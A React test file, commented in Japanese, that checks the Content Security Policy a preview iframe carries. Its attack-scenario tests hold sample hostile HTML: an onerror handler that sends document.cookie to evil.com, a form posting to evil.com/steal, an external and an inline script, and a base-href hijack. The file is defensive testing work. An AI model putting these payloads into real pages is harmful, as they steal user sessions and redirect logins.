/**
 * Content Security Policy Tests (TDD Green Phase)
 * @module csp.test
 */

import { describe, it, expect } from "vitest";
import { render, screen } from "@testing-library/react";
import { HTMLPreviewEnvironment } from "../../components/organisms/HTMLPreviewEnvironment";
import { buildCSPString, CSP_DIRECTIVES } from "../../utils/sanitize";

describe("Content Security Policy", () => {
  describe("CSP meta tagの存在", () => {
    it("iframe内にCSP meta tagが含まれる", () => {
      render(<HTMLPreviewEnvironment content="<p>Test</p>" />);

      const iframe = screen.getByTitle("Preview") as HTMLIFrameElement;
      expect(iframe.srcdoc).toContain('http-equiv="Content-Security-Policy"');
    });
  });

  describe("CSPディレクティブ", () => {
    it("script-src 'none'が設定される", () => {
      render(<HTMLPreviewEnvironment content="<p>Test</p>" />);

      const iframe = screen.getByTitle("Preview") as HTMLIFrameElement;
      expect(iframe.srcdoc).toContain("script-src 'none'");
    });

    it("connect-src 'none'が設定される", () => {
      render(<HTMLPreviewEnvironment content="<p>Test</p>" />);

      const iframe = screen.getByTitle("Preview") as HTMLIFrameElement;
      expect(iframe.srcdoc).toContain("connect-src 'none'");
    });

    it("form-action 'none'が設定される", () => {
      render(<HTMLPreviewEnvironment content="<p>Test</p>" />);

      const iframe = screen.getByTitle("Preview") as HTMLIFrameElement;
      expect(iframe.srcdoc).toContain("form-action 'none'");
    });

    it("frame-ancestors 'none'が設定される", () => {
      render(<HTMLPreviewEnvironment content="<p>Test</p>" />);

      const iframe = screen.getByTitle("Preview") as HTMLIFrameElement;
      expect(iframe.srcdoc).toContain("frame-ancestors 'none'");
    });

    it("base-uri 'none'が設定される", () => {
      render(<HTMLPreviewEnvironment content="<p>Test</p>" />);

      const iframe = screen.getByTitle("Preview") as HTMLIFrameElement;
      expect(iframe.srcdoc).toContain("base-uri 'none'");
    });

    it("object-src 'none'が設定される", () => {
      render(<HTMLPreviewEnvironment content="<p>Test</p>" />);

      const iframe = screen.getByTitle("Preview") as HTMLIFrameElement;
      expect(iframe.srcdoc).toContain("object-src 'none'");
    });

    it("default-src 'self'が設定される", () => {
      render(<HTMLPreviewEnvironment content="<p>Test</p>" />);

      const iframe = screen.getByTitle("Preview") as HTMLIFrameElement;
      expect(iframe.srcdoc).toContain("default-src 'self'");
    });

    it("style-srcでinlineが許可される", () => {
      render(<HTMLPreviewEnvironment content="<p>Test</p>" />);

      const iframe = screen.getByTitle("Preview") as HTMLIFrameElement;
      expect(iframe.srcdoc).toContain("style-src");
      expect(iframe.srcdoc).toContain("'unsafe-inline'");
    });

    it("img-srcでdata: URLが許可される", () => {
      render(<HTMLPreviewEnvironment content="<p>Test</p>" />);

      const iframe = screen.getByTitle("Preview") as HTMLIFrameElement;
      expect(iframe.srcdoc).toContain("img-src");
      expect(iframe.srcdoc).toContain("data:");
    });

    it("img-srcでhttps:が許可される", () => {
      render(<HTMLPreviewEnvironment content="<p>Test</p>" />);

      const iframe = screen.getByTitle("Preview") as HTMLIFrameElement;
      expect(iframe.srcdoc).toContain("img-src");
      expect(iframe.srcdoc).toContain("https:");
    });
  });

  describe("buildCSPString関数", () => {
    it("すべてのディレクティブを含む文字列を生成する", () => {
      const csp = buildCSPString();

      expect(csp).toContain("default-src");
      expect(csp).toContain("script-src");
      expect(csp).toContain("style-src");
      expect(csp).toContain("img-src");
      expect(csp).toContain("connect-src");
      expect(csp).toContain("frame-ancestors");
      expect(csp).toContain("form-action");
    });

    it("ディレクティブがセミコロンで区切られる", () => {
      const csp = buildCSPString();

      // 複数のディレクティブがセミコロンで区切られている
      expect(csp.split(";").length).toBeGreaterThan(1);
    });
  });

  describe("CSP_DIRECTIVES定数", () => {
    it("script-srcが'none'である", () => {
      expect(CSP_DIRECTIVES["script-src"]).toBe("'none'");
    });

    it("connect-srcが'none'である", () => {
      expect(CSP_DIRECTIVES["connect-src"]).toBe("'none'");
    });

    it("form-actionが'none'である", () => {
      expect(CSP_DIRECTIVES["form-action"]).toBe("'none'");
    });

    it("object-srcが'none'である", () => {
      expect(CSP_DIRECTIVES["object-src"]).toBe("'none'");
    });
  });

  describe("攻撃シナリオの防御", () => {
    it("外部スクリプト読み込みが防止される", () => {
      // CSPのscript-src 'none'により、外部スクリプトは読み込めない
      const maliciousContent = `
        <script src="https://evil.com/attack.js"></script>
        <p>Content</p>
      `;

      render(<HTMLPreviewEnvironment content={maliciousContent} />);

      const iframe = screen.getByTitle("Preview") as HTMLIFrameElement;
      expect(iframe.srcdoc).toContain("script-src 'none'");
    });

    it("インラインスクリプトが防止される", () => {
      // CSPのscript-src 'none'により、インラインスクリプトも実行されない
      const maliciousContent = `
        <script>alert('xss')</script>
        <p>Content</p>
      `;

      render(<HTMLPreviewEnvironment content={maliciousContent} />);

      const iframe = screen.getByTitle("Preview") as HTMLIFrameElement;
      expect(iframe.srcdoc).toContain("script-src 'none'");
    });

    it("データ送信が防止される", () => {
      // connect-src 'none'により、fetch/XHRは失敗する
      const maliciousContent = `
        <img src="x" onerror="fetch('https://evil.com/steal?data='+document.cookie)">
        <p>Content</p>
      `;

      render(<HTMLPreviewEnvironment content={maliciousContent} />);

      const iframe = screen.getByTitle("Preview") as HTMLIFrameElement;
      expect(iframe.srcdoc).toContain("connect-src 'none'");
    });

    it("フォームによるデータ送信が防止される", () => {
      // form-action 'none'により、フォーム送信は失敗する
      const maliciousContent = `
        <form action="https://evil.com/steal">
          <input type="hidden" name="data" value="sensitive">
        </form>
        <p>Content</p>
      `;

      render(<HTMLPreviewEnvironment content={maliciousContent} />);

      const iframe = screen.getByTitle("Preview") as HTMLIFrameElement;
      expect(iframe.srcdoc).toContain("form-action 'none'");
    });

    it("ベースURLハイジャックが防止される", () => {
      // base-uri 'none'により、base要素は無効
      const maliciousContent = `
        <base href="https://evil.com/">
        <a href="/login">Login</a>
        <p>Content</p>
      `;

      render(<HTMLPreviewEnvironment content={maliciousContent} />);

      const iframe = screen.getByTitle("Preview") as HTMLIFrameElement;
      expect(iframe.srcdoc).toContain("base-uri 'none'");
    });
  });

  describe("許可されるリソース", () => {
    it("インラインCSSが許可される", () => {
      const styledContent = `
        <style>
          p { color: red; }
        </style>
        <p style="font-size: 16px;">Styled content</p>
      `;

      render(<HTMLPreviewEnvironment content={styledContent} />);

      const iframe = screen.getByTitle("Preview") as HTMLIFrameElement;
      expect(iframe.srcdoc).toContain("'unsafe-inline'");
    });

    it("httpsの画像が許可される", () => {
      const imageContent = `
        <img src="https://example.com/image.png" alt="Test">
      `;

      render(<HTMLPreviewEnvironment content={imageContent} />);

      const iframe = screen.getByTitle("Preview") as HTMLIFrameElement;
      expect(iframe.srcdoc).toContain("https:");
    });

    it("data: URLの画像が許可される", () => {
      const dataImageContent = `
        <img src="data:image/png;base64,iVBORw0KGgo=" alt="Test">
      `;

      render(<HTMLPreviewEnvironment content={dataImageContent} />);

      const iframe = screen.getByTitle("Preview") as HTMLIFrameElement;
      expect(iframe.srcdoc).toContain("data:");
    });
  });
});
